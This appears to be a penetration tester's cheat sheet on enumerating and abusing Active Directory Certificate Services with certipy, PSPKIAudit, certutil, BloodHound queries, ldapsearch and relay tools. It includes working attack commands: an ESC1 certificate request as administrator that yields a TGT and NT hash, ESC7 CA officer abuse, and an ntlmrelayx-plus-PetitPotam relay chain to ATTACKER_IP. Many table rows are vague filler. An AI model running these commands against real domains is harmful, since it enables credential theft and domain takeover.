---
aliases:
  - ADCS Tooling
  - certipy
  - PSPKIAudit
  - BloodHound ADCS
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - ADCS Enumeration]]"
  - "[[BloodHound & SharpHound]]"
---
# AD - ADCS Enumeration - Tooling

***

## certipy (Linux Standard)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `certipy find -u user -p pass -dc-ip DC` | Comprehensive ADCS recon | Standard. |
| `certipy find -enabled` | Enabled templates only | Filter. |
| `certipy find -vulnerable` | ESC1-ESC15 vulnerable | Critical. |
| `certipy find -text -stdout` | Text output | Standard. |
| `certipy find -json -output adcs.json` | JSON | Parseable. |
| `certipy find -bloodhound` | BloodHound-friendly | Tool integration. |
| `certipy req -ca CA -template T` | Cert request | Standard. |
| `certipy auth -pfx cert.pfx` | Use cert for auth | Standard. |
| `certipy shadow auto -account victim` | Shadow Credentials | Adjacent. |
| `certipy ca -ca CA -add-officer attacker` | ESC7 abuse | Privileged. |
| `certipy ca -ca CA -enable-template T` | Enable disabled template | Adjacent. |
| `certipy relay -ca CA -target dc01` | ESC8 modern | Standard. |
| `certipy template -template T -save backup.json` | Backup template | Adjacent. |
| Authenticated NTLM | Standard | Standard. |
| Kerberos auth `-k` | Modern | Adjacent. |
| Modern Linux preferred | Standard | Standard. |
^ad-adcstool-certipy

### certipy comprehensive workflow

```bash
# Comprehensive ADCS recon
certipy find -u user@dom.local -p pass -dc-ip DC -text -stdout

# Vulnerable templates only
certipy find -u user -p pass -dc-ip DC -vulnerable -stdout

# JSON output
certipy find -u user -p pass -dc-ip DC -vulnerable -json -output adcs.json

# Per-template request (ESC1)
certipy req -u user -p pass -dc-ip DC \
  -ca CA-Name -template VulnTemplate \
  -upn administrator@dom.local

# Use cert for auth
certipy auth -pfx administrator.pfx -dc-ip DC

# Output: TGT + NT hash
```

___

## PSPKIAudit (Windows PowerShell)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Invoke-PKIAudit` | Comprehensive audit | Standard. |
| `Get-CertificationAuthority` | List CAs | Standard. |
| `Get-CertificateTemplate` | List templates | Standard. |
| `Get-CertificateTemplateAcl` | Per-template DACL | Standard. |
| `Get-CertificationAuthorityAcl` | Per-CA DACL | Standard. |
| `Get-IssuedCertificate` | Issued certs | Standard. |
| `Get-PendingCertificateRequest` | Pending requests | Adjacent. |
| `Get-CertRequestStatusCode` | Request status | Adjacent. |
| Native PowerShell module | Modern | Standard. |
| Comprehensive Windows-side audit | Standard | Standard. |
| Output: detailed reports | Standard | Standard. |
| Cross-correlate with priv | Standard | Audit. |
| Detection: PSPKIAudit usage | Edge | Adjacent. |
| Compliance: red team / defender both | Standard | Standard. |
| Audit baseline | Standard | Compliance. |
| Modern: comprehensive coverage | Standard | Standard. |
^ad-adcstool-pspki

### PSPKIAudit usage

```powershell
# Install
Install-Module PSPKI
Install-Module PSPKIAudit
Import-Module PSPKIAudit

# Comprehensive audit
Invoke-PKIAudit

# Per-section
Get-CertificationAuthority
Get-CertificateTemplate

# Per-template ACL
Get-CertificateTemplate | ForEach-Object {
  Get-CertificateTemplateAcl -Template $_ |
    Select-Object Name,@{n='Access';e={$_.Access}}
}
```

___

## RSAT / Native Windows

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Get-AdcsServiceObject` | CAs | Native. |
| `certutil -CAInfo` | CA detail | Standard. |
| `certutil -getreg` | CA registry | Standard. |
| `certutil -getreg policy\EditFlags` | EDITF flags | Critical. |
| `certutil -config "CA-IP\CA-Name" ...` | Per-CA target | Standard. |
| `pkiview.msc` | GUI | Adjacent. |
| `certtmpl.msc` | Template GUI | Adjacent. |
| `certsrv.msc` | CA GUI | Adjacent. |
| `certreq.exe` | Request CLI | Standard. |
| `Get-ADObject -SearchBase "CN=Public Key Services,..."` | LDAP query | Standard. |
| `Get-Acl "AD:..."` per-template | DACL audit | Standard. |
| Native Windows utilities | Always available | Standard. |
| Modern PowerShell preferred | Standard | Standard. |
| Cross-correlate with PSPKIAudit | Standard | Adjacent. |
| OPSEC: native less suspicious | Standard | OPSEC. |
| Compliance: defender baseline | Standard | Adjacent. |
^ad-adcstool-native

### Native commands

```cmd
:: CA list
certutil -config - -ping

:: Per-CA detail
certutil -CAInfo

:: EDITF flags check (ESC6)
certutil -config "CA-IP\CA-Name" -getreg policy\EditFlags

:: Per-CA settings
certutil -config "CA-IP\CA-Name" -getreg
```

```powershell
# RSAT
Get-AdcsServiceObject

# LDAP container query
Get-ADObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADRootDSE).RootDomainNamingContext)" -Filter *

# Per-template DACL
$tmpl = "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dom,DC=local"
Get-Acl "AD:$tmpl"
```

___

## BloodHound ADCS Edges

| **Edge** | **Significado** | **Notas** |
|:---:|:---:|:---:|
| `Enroll` | Template enrollment right | Standard. |
| `AutoEnroll` | Auto-enrollment | Adjacent. |
| `EnrollOnTemplate` | Direct template enroll | Modern. |
| `EnrollOnNTAuthCertStore` | NTAuth modify | Adjacent. |
| `Owns`, `WriteOwner`, `WriteDacl` on Template/CA | ACL combo | Standard. |
| `GenericAll`, `GenericWrite` on Template/CA | Standard | Standard. |
| `WritePKINameFlag` | Modify name flags | Modern. |
| `WritePKIEnrollmentFlag` | Modify enrollment flags | Modern. |
| `ManageCA` | ESC7 right | Modern. |
| `ManageCertificates` | ESC7 right | Modern. |
| BloodHound CE 5.x+ ADCS | Comprehensive | Tool. |
| BHCE 6.x improved ADCS | Modern | Tool. |
| Cypher: ESC1-ESC15 paths | Custom | Tool. |
| Visual graph: ADCS nodes | Helpful | Standard. |
| Per-domain ingest | Multi-domain | Adjacent. |
| Compliance: ADCS baseline queries | Standard | Adjacent. |
^ad-adcstool-bh

### BloodHound ADCS queries

```cypher
// All ESC1 paths
MATCH (u {owned: true})-[:Enroll|AutoEnroll|MemberOf*1..]->(t:CertTemplate)
WHERE t.enrolleesuppliessubject = true
  AND t.authenticationenabled = true
  AND t.requiresmanagerapproval = false
  AND t.authorizedsignatures = 0
RETURN u.name, t.name

// ESC4: template ACL paths
MATCH (u {owned: true})-[:Owns|WriteOwner|WriteDacl|GenericAll|GenericWrite|WritePKINameFlag|WritePKIEnrollmentFlag*1..]->(t:CertTemplate)
RETURN u.name, t.name

// ESC7: Manage CA paths
MATCH (u {owned: true})-[:ManageCA|ManageCertificates|MemberOf*1..]->(c:CA)
RETURN u.name, c.name

// All paths to DA via ADCS
MATCH (u {owned: true}), (g:Group {name: "DOMAIN ADMINS@DOM.LOCAL"})
MATCH p=shortestPath((u)-[*1..]->(g))
WHERE ANY(rel IN relationships(p) WHERE type(rel) IN ["Enroll","AutoEnroll","ManageCA","ManageCertificates","WritePKINameFlag","WritePKIEnrollmentFlag"])
RETURN p
```

___

## ldapsearch / Linux LDAP

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| LDAP enumerate templates | `(objectClass=pKICertificateTemplate)` | Direct. |
| LDAP enumerate CAs | `(objectClass=pKIEnrollmentService)` | Direct. |
| LDAP NTAuth | `CN=NTAuthCertificates,...` | Standard. |
| Per-attribute query | Custom | Standard. |
| Cross-correlate templates + CAs | Standard | Adjacent. |
| Authenticated bind | Standard | Reliable. |
| LDAPS | Encrypted | Standard. |
| Linux native | Standard | Standard. |
| Cross-domain via GC | Edge | Adjacent. |
| Output LDIF | Default | Standard. |
| Modern: certipy preferred wrapper | Standard | Standard. |
| Adjacent: bloodyAD | LDAP modify | Adjacent. |
| Detection: bulk LDAP queries | Defender | Adjacent. |
| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
| Modern: BHCE preferred | Standard | Tool. |
| Compliance: red team scoped | Standard | OPSEC. |
^ad-adcstool-ldapsearch

### ldapsearch ADCS templates

```bash
# All templates
ldapsearch -h DC -D 'dom\u' -w pass \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dom,DC=local" \
  "(objectClass=pKICertificateTemplate)" \
  cn displayName flags pKIExtendedKeyUsage \
  msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag \
  msPKI-RA-Signature

# All CAs
ldapsearch -h DC -D 'dom\u' -w pass \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=dom,DC=local" \
  "(objectClass=pKIEnrollmentService)" \
  cn dnsHostName cACertificate
```

___

## ADRecon / Bulk Reports

| **Tool** | **Output** | **Notas** |
|:---:|:---:|:---:|
| ADRecon ADCS section | XLSX | Standard. |
| `.\ADRecon.ps1 -Method LDAP -Collect ADCS` | Targeted | Adjacent. |
| ADCollector .NET | Faster | Standard. |
| PingCastle ADCS | Defender | Standard. |
| Purple Knight ADCS | Defender | Standard. |
| Microsoft Defender for Identity ADCS | Modern | Defender. |
| BloodyAD ADCS modify | Privileged | Adjacent. |
| Custom Python + ldap3 | DIY | Standard. |
| Cross-correlate with priv | Standard | Adjacent. |
| Per-CA bulk audit | Standard | Compliance. |
| Compliance: documented baseline | Standard | Adjacent. |
| Modern: continuous monitoring | Defender | Standard. |
| Detection: bulk ADCS modify | Defender | Adjacent. |
| Audit log retention | Standard | Adjacent. |
| Stale ADCS configs | Audit | Standard. |
| Cleanup post-engagement | Standard | OPSEC. |
^ad-adcstool-bulk

### ADRecon ADCS

```powershell
# ADRecon comprehensive (includes ADCS)
.\ADRecon\ADRecon.ps1 -Method LDAP -DomainController DC -Collect ADCS

# Output: ADRecon-Report-...\ADCS_*.xlsx
```

___

## NTLM Relay Tools (ESC8)

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| ntlmrelayx (Impacket) | Standard | Standard. |
| `ntlmrelayx --target http://CA/certsrv/certfnsh.asp --adcs --template DomainController` | ESC8 standard | Standard. |
| `ntlmrelayx -tf targets.txt --adcs` | Bulk | Adjacent. |
| `ntlmrelayx --target https://CA/certsrv/...` | HTTPS variant | Standard. |
| certipy relay | Modern alternative | Standard. |
| `certipy relay -ca CA -target dc01` | Modern | Standard. |
| krbrelayx | Adjacent Kerberos | Adjacent. |
| Coercion tools | PetitPotam, PrinterBug, etc. | Standard. |
| Combined: coercion + relay → cert | Standard chain | Standard. |
| Detection: relay events | Defender | Adjacent. |
| Modern: extreme alerting | Best practice | Standard. |
| Cleanup: revert cert issuance | Standard | OPSEC. |
| Adjacent: NTLM Relay hub | Cross-ref | Adjacent. |
| Adjacent: Coercion hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Audit log retention | Standard | Adjacent. |
^ad-adcstool-relay

### ESC8 chain tools

```bash
# Terminal 1: ntlmrelayx
sudo ntlmrelayx.py \
  -t http://CA/certsrv/certfnsh.asp \
  --adcs --template DomainController \
  --no-smb-server

# Terminal 2: PetitPotam
python3 PetitPotam.py ATTACKER_IP DC_IP

# Modern alternative: certipy relay
certipy relay -ca CA-Name -target dc01.dom.local
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| HackTricks - ADCS | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates` | Reference. |
| The Hacker Recipes - ADCS | `thehacker.recipes/ad/movement/ad-cs` | Comprehensive. |
| Certipy docs | `github.com/ly4k/Certipy` | Tool. |
| PSPKIAudit | `github.com/GhostPack/PSPKIAudit` | Tool. |
| SpecterOps - "Certified Pre-Owned" | Whitepaper | Foundational ESC research. |
| Will Schroeder - ADCS | Specter Ops blog | Research. |
| Lee Christensen - ADCS | Specter Ops blog | Research. |
| BloodHound docs | `bloodhound.specterops.io` | Tool. |
| Microsoft - ADCS Documentation | `learn.microsoft.com/en-us/windows-server/identity/ad-cs/` | Vendor. |
| Microsoft Defender for Identity ADCS | Modern | Defender. |
| PingCastle | `www.pingcastle.com` | Audit. |
| Purple Knight | `www.semperis.com/purple-knight/` | Audit. |
| MITRE ATT&CK T1649 | Steal or Forge Authentication Certificates | Adjacent. |
| `awesome-active-directory` | GitHub | Foundation. |
| CVE-2022-26923 (Certifried) | Patched | Adjacent. |
^ad-adcstool-resources

***
